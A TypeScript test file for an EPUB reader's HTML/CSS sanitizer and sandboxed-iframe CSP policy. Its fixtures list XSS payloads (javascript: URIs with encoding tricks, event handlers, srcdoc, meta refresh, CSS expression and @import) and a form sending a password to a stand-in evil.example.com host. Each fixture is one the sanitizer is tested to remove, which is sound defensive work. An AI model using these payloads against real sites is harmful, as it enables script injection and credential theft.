import { describe, expect, it } from "vitest";
import {
  chapterCsp,
  chapterFramePolicy,
  chapterSandboxAttribute,
  CHAPTER_SANDBOX,
} from "../../src/features/reader/epub/isolation.ts";
import { classifyUrl, escapeText, sanitizeChapter, sanitizeCss } from "../../src/features/reader/epub/sanitize.ts";

const LOCAL = (href: string) => (href.startsWith("../images/") || href.startsWith("images/") ? `blob:reader/${href}` : null);

/** Scripts that must not survive any path through the sanitizer. */
const SCRIPT_FIXTURES: [name: string, input: string][] = [
  ["script element", `<p>a</p><script>alert(1)</script><p>b</p>`],
  ["uppercase script", `<SCRIPT>alert(1)</SCRIPT>`],
  ["script with attributes", `<script type="text/javascript" src="https://evil.example.com/x.js"></script>`],
  ["inline event handler", `<p onclick="alert(1)">text</p>`],
  ["uppercase handler", `<p ONMOUSEOVER="alert(1)">text</p>`],
  ["handler with newlines", `<p on\nclick="alert(1)">text</p>`],
  ["javascript href", `<a href="javascript:alert(1)">click</a>`],
  ["javascript href uppercase", `<a href="JavaScript:alert(1)">click</a>`],
  ["javascript href with tab", `<a href="java\tscript:alert(1)">click</a>`],
  ["entity-encoded javascript href", `<a href="&#106;avascript:alert(1)">click</a>`],
  ["leading-space javascript href", `<a href="  javascript:alert(1)">click</a>`],
  ["data uri image", `<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`],
  ["svg onload", `<svg onload="alert(1)"></svg>`],
  ["math xlink", `<math><mtext></mtext></math>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
  ["object data", `<object data="https://evil.example.com/x.swf"></object>`],
  ["embed src", `<embed src="https://evil.example.com/x.swf">`],
  ["form action", `<form action="https://evil.example.com/steal"><input name="pw"><button>go</button></form>`],
  ["body onload", `<body onload="alert(1)"><p>x</p></body>`],
  ["style expression", `<p style="width: expression(alert(1))">x</p>`],
  ["style url javascript", `<p style="background: url(javascript:alert(1))">x</p>`],
  ["moz-binding", `<p style="-moz-binding: url(https://evil.example.com/x.xml)">x</p>`],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil.example.com/x.css">`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example.com">`],
  ["base tag", `<base href="https://evil.example.com/">`],
  ["unclosed script tag", `<p>a</p><script>alert(1)`],
  ["nested script in style", `<style>@import url(https://evil.example.com/x.css)</style>`],
  ["template smuggling", `<template><script>alert(1)</script></template>`],
  ["noscript smuggling", `<noscript><img src=x onerror=alert(1)></noscript>`],
];

describe("sanitization: no script survives (s8, s18)", () => {
  for (const [name, input] of SCRIPT_FIXTURES) {
    it(`neutralizes ${name}`, () => {
      const result = sanitizeChapter(input, { resolveResource: LOCAL });
      expect(result.ok).toBe(true);
      if (!result.ok) return;
      const html = result.html;
      expect(html).not.toMatch(/<script/i);
      expect(html).not.toMatch(/<\/script/i);
      expect(html).not.toMatch(/\son[a-z]+\s*=/i);
      expect(html).not.toMatch(/javascript\s*:/i);
      expect(html).not.toMatch(/<\s*(iframe|object|embed|form|input|button|link|meta|base|svg|math|template|noscript|style)\b/i);
      expect(html).not.toMatch(/expression\s*\(/i);
      expect(html).not.toMatch(/evil\.example\.com/);
    });
  }

  it("keeps readable prose and drops only the script", () => {
    const result = sanitizeChapter(`<p>before</p><script>alert(1)</script><p>after</p>`);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).toContain("before");
    expect(result.html).toContain("after");
  });

  it("counts what it dropped", () => {
    const result = sanitizeChapter(`<p onclick="a()">x</p><script>y()</script><a href="javascript:1">z</a>`);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.counters.droppedHandlers).toBe(1);
    expect(result.counters.blockedSchemes).toBe(1);
    expect(result.counters.droppedTags).toBeGreaterThanOrEqual(1);
  });
});

describe("sanitization: no remote URL remains (s8, s18)", () => {
  it("drops remote images, stylesheets and media without a resolver", () => {
    const result = sanitizeChapter(
      `<img src="https://tracker.example.com/pixel.gif"><img src="http://x.example.com/a.png">` +
        `<link rel="stylesheet" href="//cdn.example.com/a.css"><p style="background:url(https://t.example.com/b.png)">x</p>`,
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).not.toMatch(/example\.com/);
    expect(result.counters.remoteResources).toBeGreaterThanOrEqual(2);
  });

  it("rewrites only resolver-approved local assets", () => {
    const result = sanitizeChapter(
      `<img src="../images/cover.png"><img src="https://tracker.example.com/p.gif"><img src="other/x.png">`,
      { resolveResource: LOCAL },
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).toContain(`src="blob:reader/../images/cover.png"`);
    expect(result.html).not.toMatch(/tracker\.example\.com/);
    expect(result.counters.rewrittenResources).toBe(1);
  });

  it("keeps http(s) links but hardens rel", () => {
    const result = sanitizeChapter(`<a href="https://example.com/x">link</a>`);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).toContain(`href="https://example.com/x"`);
    expect(result.html).toContain("noopener");
  });

  it("drops external links entirely when the adapter disables them", () => {
    const result = sanitizeChapter(`<a href="https://example.com/x">link</a>`, { allowExternalLinks: false });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).toContain("link");
    expect(result.html).not.toMatch(/example\.com/);
  });
});

describe("sanitization: URL classification", () => {
  it("classifies schemes the way a browser does, after decoding", () => {
    expect(classifyUrl("javascript:alert(1)")).toEqual({ kind: "scheme", scheme: "javascript" });
    expect(classifyUrl("&#x6a;avascript:alert(1)")).toEqual({ kind: "scheme", scheme: "javascript" });
    expect(classifyUrl("java\tscript:alert(1)")).toEqual({ kind: "scheme", scheme: "javascript" });
    expect(classifyUrl("  \n javascript:alert(1)")).toEqual({ kind: "scheme", scheme: "javascript" });
    expect(classifyUrl("data:text/html,x")).toEqual({ kind: "scheme", scheme: "data" });
    expect(classifyUrl("file:///etc/passwd")).toEqual({ kind: "scheme", scheme: "file" });
    expect(classifyUrl("myapp:open")).toEqual({ kind: "scheme", scheme: "myapp" });
    expect(classifyUrl("mailto:a@b.com")).toEqual({ kind: "scheme", scheme: "mailto" });
    expect(classifyUrl("https://example.com")).toEqual({ kind: "scheme", scheme: "https" });
    expect(classifyUrl("#frag")).toEqual({ kind: "fragment", scheme: "" });
    expect(classifyUrl("images/a.png")).toEqual({ kind: "relative", scheme: "" });
    expect(classifyUrl("")).toEqual({ kind: "empty", scheme: "" });
  });

  it("escapes stray angle brackets in prose instead of parsing them", () => {
    const result = sanitizeChapter(`<p>1 < 2 and 3 > 2</p>`);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).toContain("&lt;");
    expect(escapeText("a<b>c&d")).toBe("a&lt;b&gt;c&amp;d");
  });
});

describe("sanitization: CSS", () => {
  it("removes @import, expression and binding payloads", () => {
    const css = `@import url(https://evil.example.com/x.css);p{width:expression(alert(1));-moz-binding:url(x.xml)}`;
    const out = sanitizeCss(css);
    expect(out).not.toMatch(/evil\.example\.com/);
    expect(out).not.toMatch(/expression/i);
    expect(out).not.toMatch(/-moz-binding/i);
  });

  it("keeps local relative url() references", () => {
    expect(sanitizeCss(`p{background:url("images/bg.png")}`)).toContain("images/bg.png");
  });

  it("neutralizes remote and javascript url() targets", () => {
    expect(sanitizeCss(`p{background:url(https://t.example.com/p.gif)}`)).toContain("about:invalid");
    expect(sanitizeCss(`p{background:url(data:text/html,x)}`)).toContain("about:invalid");
  });
});

describe("sanitization: bounded input", () => {
  it("rejects an oversized chapter before parsing", () => {
    const result = sanitizeChapter("<p>x</p>".repeat(100), { maxChars: 50 });
    expect(result).toEqual({ ok: false, reason: "section-length", detail: expect.stringContaining("exceeds limit") });
  });

  it("closes unbalanced tags so emitted markup nests", () => {
    const result = sanitizeChapter(`<div><p>text`);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.html).toBe("<div><p>text</p></div>");
  });
});

describe("iframe isolation policy (s8)", () => {
  it("permits host selection integration without permitting scripts", () => {
    expect(CHAPTER_SANDBOX).toBe("allow-same-origin");
    expect(chapterSandboxAttribute()).toBe("allow-same-origin");
    // The forbidden combination, spelled out: same-origin + scripts would let
    // publication code reach out of the sandbox.
    expect(CHAPTER_SANDBOX).not.toMatch(/allow-scripts/);
    expect(CHAPTER_SANDBOX).not.toMatch(/allow-top-navigation/);
    expect(CHAPTER_SANDBOX).not.toMatch(/allow-forms/);
    expect(CHAPTER_SANDBOX).not.toMatch(/allow-popups/);
  });

  it("denies scripts, forms, top navigation and network in the CSP", () => {
    const csp = chapterCsp();
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("frame-src 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).not.toMatch(/unsafe-eval/);
    expect(csp).not.toMatch(/unsafe-inline.*script/);
    expect(csp).not.toMatch(/https?:/);
  });

  it("pairs the sandbox and the CSP into a srcdoc that cannot escape", () => {
    const policy = chapterFramePolicy("<p>chapter</p>");
    expect(policy.sandbox).toBe(CHAPTER_SANDBOX);
    expect(policy.srcdoc).toContain("<meta http-equiv=\"Content-Security-Policy\"");
    expect(policy.srcdoc).toContain(policy.csp);
    expect(policy.srcdoc).toContain("<p>chapter</p>");
    expect(policy.srcdoc).not.toMatch(/<script/i);
  });

  it("cannot be broken out of by a closing style tag in book CSS", () => {
    const policy = chapterFramePolicy("<p>x</p>", "p{}</style><script>alert(1)</script><style>");
    expect(policy.srcdoc).not.toMatch(/<script/i);
  });
});
